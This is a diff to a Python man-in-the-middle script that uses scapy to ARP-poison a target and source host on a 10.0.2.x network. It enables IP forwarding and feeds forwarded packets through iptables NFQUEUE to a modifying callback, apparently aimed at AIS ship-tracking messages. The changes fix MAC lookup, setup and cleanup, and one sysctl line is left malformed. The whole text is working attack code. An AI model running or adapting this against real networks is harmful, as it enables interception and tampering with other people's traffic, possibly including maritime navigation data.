@@ -1,12 +1,12 @@
 from scapy.all import *
-from scipy.fft import dst
-#from netfilterqueue import NetfilterQueue
+#from scapy.fft import dst
+from netfilterqueue import NetfilterQueue
 import codecs
 import os
 import time
 import sys
 import argparse
-from multiprocessing import Process
+import pyais
 
 target_ip = "10.0.2.26"
 src_ip = "10.0.2.25"
@@ -41,17 +41,18 @@ class MITM:
         packet.accept()
 
     def setup(self):
-        iptable_config = f"sudo iptables -A FORWARD -j NFQUEUE --queue-num 0 -d {target_ip}"
-        ip_forward = "sudo sysctl net.ipv4.ip_forward=1"
+        iptable_config = f"sudo iptables -A FORWARD -j NFQUEUE --queue-num 0 -d {self.target_ip} > /dev/null 2>&1"
+        ip_forward = "sudo sysctl net.ipv4.ip_forward=1 /dev/null 2>&1"
         os.system(iptable_config)
         os.system(ip_forward)
         self.nfqueue.bind(0, self.modify)
 
     def get_mac(self, ip):
         try:
-            ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip),timeout =2, iface=self.iface, inter=0.1)
-            for snd,rcv in ans:
-                return rcv.sprintf(r"%Ether.src%")
+            resp = srp1(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip),timeout =2, iface=self.iface, inter=0.1)
+            
+            return resp.hwsrc
+            
         except Exception as e:
             print(f"[!] Could not find MAC address for {ip}")
             print(f"[!] Exiting....")
@@ -79,17 +80,16 @@ class MITM:
         os.system('iptables -F')
         os.system('iptables -X')
         print("[*] Disabling IP forwarding")
-        os.system("sudo sysctl net.ipv4.ip_forward=1")
+        os.system("sudo sysctl net.ipv4.ip_forward=0")
 
     def start_mitm(self):
         try:
-            print(f"[*] Getting MAC address of {self.src_ip}", end=" ..... ")
-            self.src_mac = self.get_mac(self.src_ip)
-            print(self.src_mac)
             
-            print(f"[*] Getting MAC address of {self.target_ip}", end=" ..... ")
+            self.src_mac = self.get_mac(self.src_ip)
             self.target_mac = self.get_mac(self.target_ip)
-            print(self.src_mac)
+            
+            print(f"[*] Getting MAC address of {self.src_ip}: {self.src_mac}")
+            print(f"[*] Getting MAC address of {self.target_ip}: {self.target_mac}")
 
             self.arp_poison()
             time.sleep(1.5)
@@ -101,8 +101,6 @@ class MITM:
 
     def stop_mitm(self):
         self.clean_up()
-
-
 
 
 def get_input():
@@ -119,12 +117,13 @@ if __name__ == '__main__':
     args = get_input()
     
     mitm = MITM(args.target_ip, args.source_ip, args.interface)
+    mitm.setup()
     mitm.start_mitm()
     
     try:
         print ("[*] waiting for data")
         mitm.nfqueue.run()
     except KeyboardInterrupt:
-        pass
+    	mitm.stop_mitm()
 
     mitm.nfqueue.unbind()
